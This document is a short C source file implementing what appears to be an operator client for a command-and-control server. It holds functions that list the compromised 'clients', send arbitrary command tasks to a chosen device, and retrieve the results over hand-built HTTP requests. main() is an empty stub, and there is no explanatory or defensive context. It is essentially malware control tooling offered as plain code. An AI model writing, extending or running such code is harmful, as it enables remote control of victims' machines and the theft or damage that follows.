#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <inttypes.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int create_c2_connection(struct in_addr c2_ip, uint16_t c2_port) {

	int fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) {
		return -1;
	}

	struct sockaddr_in destination = {0};
	destination.sin_family = AF_INET;
	destination.sin_addr = c2_ip;
	destination.sin_port = htons(c2_port);
	if (connect(fd, (struct sockaddr *)&destination, sizeof(destination)) < 0) {
		close(fd);
		return -1;
	}

	return fd;

}

void send_http_request(int connection_fd, const char *method, const char *path, const unsigned char *request_body, size_t request_body_length) {

	char headers[256];
	int headers_length = sprintf(headers, "%s %s HTTP/1.1\r\nHost: c2\r\nContent-Type: text/plain\r\nContent-Length: %zu\r\nConnection: close\r\n\r\n", method, path, request_body_length);
	send(connection_fd, headers, (size_t)headers_length, 0);
	if (request_body_length > 0) {
		send(connection_fd, request_body, request_body_length, 0);
	}

}

unsigned char *receive_http_response(int connection_fd, size_t *response_body_length) {

	size_t capacity = 4096;
	size_t response_length = 0;
	unsigned char *response = malloc(capacity);
	ssize_t header_end = -1;
	while (header_end < 0) {
		if (response_length == capacity) {
			capacity *= 2;
			response = realloc(response, capacity);
		}
		ssize_t received_length = recv(connection_fd, response + response_length, capacity - response_length, 0);
		if (received_length <= 0) {
			free(response);
			return NULL;
		}
		response_length += (size_t)received_length;
		for (size_t i = 0; i + 4 <= response_length; i++) {
			if (response[i] == '\r' && response[i + 1] == '\n' && response[i + 2] == '\r' && response[i + 3] == '\n') {
				header_end = (ssize_t)i;
				break;
			}
		}
	}

	size_t header_length = (size_t)header_end + 4;
	size_t content_length = 0;
	char *content_length_header = strstr((const char *)response, "Content-Length:");
	if (content_length_header != NULL) {
		content_length = (size_t)strtol(content_length_header + 15, NULL, 10);
	}

	while (response_length < header_length + content_length) {
		if (response_length == capacity) {
			capacity *= 2;
			response = realloc(response, capacity);
		}
		ssize_t received_length = recv(connection_fd, response + response_length, capacity - response_length, 0);
		if (received_length <= 0) {
			free(response);
			return NULL;
		}
		response_length += (size_t)received_length;
	}

	unsigned char *response_body = malloc(content_length + 1);
	memcpy(response_body, response + header_length, content_length);
	response_body[content_length] = 0;
	free(response);
	*response_body_length = content_length;
	return response_body;

}

unsigned char *list_clients(struct in_addr c2_ip, uint16_t c2_port, size_t *response_body_length) {

	int connection_fd = create_c2_connection(c2_ip, c2_port);
	if (connection_fd < 0) {
		*response_body_length = 0;
		return NULL;
	}

	send_http_request(connection_fd, "GET", "/clients", NULL, 0);
	unsigned char *response_body = receive_http_response(connection_fd, response_body_length);
	close(connection_fd);
	return response_body;

}

unsigned char *create_task(struct in_addr c2_ip, uint16_t c2_port, uint64_t device_id, const unsigned char *command, size_t command_length, size_t *response_body_length) {

	char path[64];
	sprintf(path, "/clients/%016" PRIx64 "/task", device_id);

	int connection_fd = create_c2_connection(c2_ip, c2_port);
	if (connection_fd < 0) {
		*response_body_length = 0;
		return NULL;
	}

	send_http_request(connection_fd, "POST", path, command, command_length);
	unsigned char *response_body = receive_http_response(connection_fd, response_body_length);
	close(connection_fd);
	return response_body;

}

unsigned char *list_task_results(struct in_addr c2_ip, uint16_t c2_port, uint64_t device_id, size_t *response_body_length) {

	char path[64];
	sprintf(path, "/clients/%016" PRIx64 "/results", device_id);

	int connection_fd = create_c2_connection(c2_ip, c2_port);
	if (connection_fd < 0) {
		*response_body_length = 0;
		return NULL;
	}

	send_http_request(connection_fd, "GET", path, NULL, 0);
	unsigned char *response_body = receive_http_response(connection_fd, response_body_length);
	close(connection_fd);
	return response_body;

}

int main(){
	return 0;
}
